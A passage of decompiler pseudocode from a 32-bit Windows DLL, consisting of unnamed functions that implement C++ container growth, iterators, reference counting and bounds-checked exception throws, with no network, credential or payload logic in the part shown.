  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10004DB7) --------------------------------------------------------
unsigned int __stdcall sub_10004DB7(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10004DC8) --------------------------------------------------------
unsigned int __thiscall sub_10004DC8(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_100050D8, sub_10001834);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_10005113((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10004E78) --------------------------------------------------------
void *__thiscall sub_10004E78(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_1007A868;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_100050D8, sub_10001834);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_10005113(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10001743(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10004FA2) --------------------------------------------------------
_DWORD *__userpurge sub_10004FA2@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10004FE6) --------------------------------------------------------
void __thiscall sub_10004FE6(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100051BC((int)this);
}

//----- (10005039) --------------------------------------------------------
_DWORD *__userpurge sub_10005039@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000507D) --------------------------------------------------------
void __thiscall sub_1000507D(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100051F6((int)this);
}

//----- (100050BC) --------------------------------------------------------
_DWORD *__thiscall sub_100050BC(_DWORD *Block, char a2)
{
  sub_10004B05(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100050D8) --------------------------------------------------------
_DWORD *__thiscall sub_100050D8(_DWORD *this)
{
  return sub_100017F0(this, 0);
}

//----- (100050E4) --------------------------------------------------------
_DWORD *__stdcall sub_100050E4(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100930AC;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100930AC: using guessed type int (__thiscall *off_100930AC)(void *Block, char);

//----- (10005113) --------------------------------------------------------
_DWORD *__usercall sub_10005113@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100018F6((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10005138) --------------------------------------------------------
void __usercall sub_10005138(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x84u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(v2 + 1, 8u, 16, (void (__thiscall *)(void *))sub_100050D8, sub_10001834);
  }
  a1[3] = v1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100051BC) --------------------------------------------------------
void __usercall sub_100051BC(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100051F6) --------------------------------------------------------
void __usercall sub_100051F6(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000524E) --------------------------------------------------------
_DWORD *__stdcall sub_1000524E(_DWORD *a1)
{
  _DWORD *v1; // eax
  size_t v2; // ecx
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  size_t v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  size_t v8; // ecx
  _DWORD *v9; // eax
  size_t v11; // [esp-8h] [ebp-24h] BYREF
  size_t v12; // [esp-4h] [ebp-20h]
  void *Block; // [esp+Ch] [ebp-10h]
  int v14; // [esp+18h] [ebp-4h]

  sub_10005354(a1);
  v14 = 0;
  v12 = 4;
  *a1 = &off_1009324C;
  v1 = operator new(v12);
  v2 = v12;
  Block = v1;
  LOBYTE(v14) = 1;
  if ( v1 )
    v3 = sub_1001C0D7(v1);
  else
    v3 = 0;
  LOBYTE(v14) = 0;
  v12 = v2;
  v11 = v2;
  Block = &v11;
  sub_100033DA(&v11, (int)v3);
  LOBYTE(v14) = 0;
  sub_10014B07(a1, v11, v12);
  v4 = operator new(0xCu);
  v5 = v12;
  Block = v4;
  LOBYTE(v14) = 3;
  if ( v4 )
    v6 = sub_1001C1DC(v4);
  else
    v6 = 0;
  LOBYTE(v14) = 0;
  v12 = v5;
  v11 = v5;
  Block = &v11;
  sub_100033DA(&v11, (int)v6);
  LOBYTE(v14) = 0;
  sub_10014B07(a1, v11, v12);
  v7 = operator new(0xCu);
  v8 = v12;
  Block = v7;
  LOBYTE(v14) = 5;
  if ( v7 )
    v9 = sub_1001BF99(v7);
  else
    v9 = 0;
  LOBYTE(v14) = 0;
  v12 = v8;
  v11 = v8;
  Block = &v11;
  sub_100033DA(&v11, (int)v9);
  LOBYTE(v14) = 0;
  sub_10014B07(a1, v11, v12);
  return a1;
}
// 10005290: variable 'v2' is possibly undefined
// 100052CB: variable 'v5' is possibly undefined
// 10005306: variable 'v8' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009324C: using guessed type int (__thiscall *off_1009324C)(void *Block, char);

//----- (10005338) --------------------------------------------------------
_DWORD *__thiscall sub_10005338(_DWORD *Block, char a2)
{
  sub_100053D0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005354) --------------------------------------------------------
_DWORD *__stdcall sub_10005354(_DWORD *a1)
{
  *a1 = &off_10093164;
  *a1 = &off_1009316C;
  sub_10005D27(a1 + 1);
  return a1;
}
// 10093164: using guessed type int (__thiscall *off_10093164)(void *Block, char);
// 1009316C: using guessed type int (__thiscall *off_1009316C)(void *Block, char);

//----- (10005390) --------------------------------------------------------
_DWORD *__thiscall sub_10005390(_DWORD *Block, char a2)
{
  sub_10014AD4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100053D0) --------------------------------------------------------
void *__thiscall sub_100053D0(_DWORD *this)
{
  *this = &off_1009324C;
  return sub_10014AD4(this);
}
// 1009324C: using guessed type int (__thiscall *off_1009324C)(void *Block, char);

//----- (100053F9) --------------------------------------------------------
_DWORD *__thiscall sub_100053F9(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100059F1(this, v3, 0);
  else
    v4 = 0;
  sub_1000623E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10005456) --------------------------------------------------------
_DWORD *__thiscall sub_10005456(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10005B61(this, v3, 0);
  else
    v4 = 0;
  sub_100062D5(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100054B3) --------------------------------------------------------
_DWORD *__thiscall sub_100054B3(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100059F1(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000623E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10005518) --------------------------------------------------------
_DWORD *__thiscall sub_10005518(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10005B61(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100062D5(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000557D) --------------------------------------------------------
_DWORD *__thiscall sub_1000557D(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100059F1(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1000623E(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100055FC) --------------------------------------------------------
_DWORD *__thiscall sub_100055FC(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10005B61(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100062D5(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000567B) --------------------------------------------------------
void *__thiscall sub_1000567B(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078881;
  *this = &off_100931D4;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100931D4: using guessed type int (__thiscall *off_100931D4)(void *Block, char);

//----- (100056A5) --------------------------------------------------------
int *__thiscall sub_100056A5(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10005980(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100056FD: variable 'v5' is possibly undefined

//----- (10005718) --------------------------------------------------------
int *__thiscall sub_10005718(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100059C0(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10005770: variable 'v5' is possibly undefined

//----- (1000578B) --------------------------------------------------------
void __thiscall sub_1000578B(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10006282(v2);
}

//----- (100057C9) --------------------------------------------------------
void __thiscall sub_100057C9(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10006282(v3);
}

//----- (1000580A) --------------------------------------------------------
void __thiscall sub_1000580A(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10006282(v2);
}

//----- (10005848) --------------------------------------------------------
int __thiscall sub_10005848(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10006319(v4);
  return v2;
}

//----- (1000588C) --------------------------------------------------------
int __thiscall sub_1000588C(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10006282(v4);
  return v2;
}

//----- (100058D0) --------------------------------------------------------
void __thiscall sub_100058D0(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10006282(v1);
}

//----- (10005925) --------------------------------------------------------
_DWORD *__thiscall sub_10005925(_DWORD *Block, char a2)
{
  sub_1000567B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005980) --------------------------------------------------------
int __usercall sub_10005980@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100059C0) --------------------------------------------------------
int __usercall sub_100059C0@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100059F1) --------------------------------------------------------
_DWORD *__thiscall sub_100059F1(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009320C;
  a2[1] = this;
  *a2 = &off_10093258;
  a2[2] = a3;
  return result;
}
// 1009320C: using guessed type int (__thiscall *off_1009320C)(void *Block, char);
// 10093258: using guessed type int (__thiscall *off_10093258)(void *Block, char);

//----- (10005A29) --------------------------------------------------------
void *__thiscall sub_10005A29(_DWORD *this)
{
  void *result; // eax

  result = &loc_100787F1;
  *this = &off_10093258;
  *this = &off_1009320C;
  return result;
}
// 1009320C: using guessed type int (__thiscall *off_1009320C)(void *Block, char);
// 10093258: using guessed type int (__thiscall *off_10093258)(void *Block, char);

//----- (10005A53) --------------------------------------------------------
bool __thiscall sub_10005A53(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10005A6A) --------------------------------------------------------
BOOL __thiscall sub_10005A6A(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10005A74) --------------------------------------------------------
int __thiscall sub_10005A74(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10005AAF) --------------------------------------------------------
int __thiscall sub_10005AAF(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10005AE5) --------------------------------------------------------
int __thiscall sub_10005AE5(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10005B0D) --------------------------------------------------------
int __thiscall sub_10005B0D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10005B48) --------------------------------------------------------
int __thiscall sub_10005B48(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10005B61) --------------------------------------------------------
_DWORD *__thiscall sub_10005B61(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009322C;
  a2[1] = this;
  *a2 = &off_10093278;
  a2[2] = a3;
  return result;
}
// 1009322C: using guessed type int (__thiscall *off_1009322C)(void *Block, char);
// 10093278: using guessed type int (__thiscall *off_10093278)(void *Block, char);

//----- (10005B99) --------------------------------------------------------
void *__thiscall sub_10005B99(_DWORD *this)
{
  void *result; // eax

  result = &loc_100787CD;
  *this = &off_10093278;
  *this = &off_1009322C;
  return result;
}
// 1009322C: using guessed type int (__thiscall *off_1009322C)(void *Block, char);
// 10093278: using guessed type int (__thiscall *off_10093278)(void *Block, char);

//----- (10005BC3) --------------------------------------------------------
bool __thiscall sub_10005BC3(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10005BDA) --------------------------------------------------------
BOOL __thiscall sub_10005BDA(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10005BE4) --------------------------------------------------------
int __thiscall sub_10005BE4(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10005C1F) --------------------------------------------------------
int __thiscall sub_10005C1F(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10005C55) --------------------------------------------------------
int __thiscall sub_10005C55(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10005C7D) --------------------------------------------------------
int __thiscall sub_10005C7D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10005CB8) --------------------------------------------------------
int __thiscall sub_10005CB8(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10005CD1) --------------------------------------------------------
_DWORD *__thiscall sub_10005CD1(_DWORD *Block, char a2)
{
  sub_10005A29(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005CED) --------------------------------------------------------
_DWORD *__thiscall sub_10005CED(_DWORD *Block, char a2)
{
  sub_10005B99(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005D27) --------------------------------------------------------
_DWORD *__stdcall sub_10005D27(_DWORD *a1)
{
  sub_10006380(a1);
  *a1 = &off_10093178;
  sub_100063D4(a1);
  return a1;
}
// 10093178: using guessed type int (__thiscall *off_10093178)(void *Block, char);

//----- (10005D5F) --------------------------------------------------------
int *__thiscall sub_10005D5F(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10003339(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10005DA1) --------------------------------------------------------
void *__thiscall sub_10005DA1(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10093178;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10003339(v2);
  this[3] = 0;
  v5 = -1;
  return sub_1000567B(this);
}
// 10093178: using guessed type int (__thiscall *off_10093178)(void *Block, char);

//----- (10005E02) --------------------------------------------------------
int __thiscall sub_10005E02(_DWORD *this)
{
  return this[1];
}

//----- (10005E06) --------------------------------------------------------
_DWORD *__thiscall sub_10005E06(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
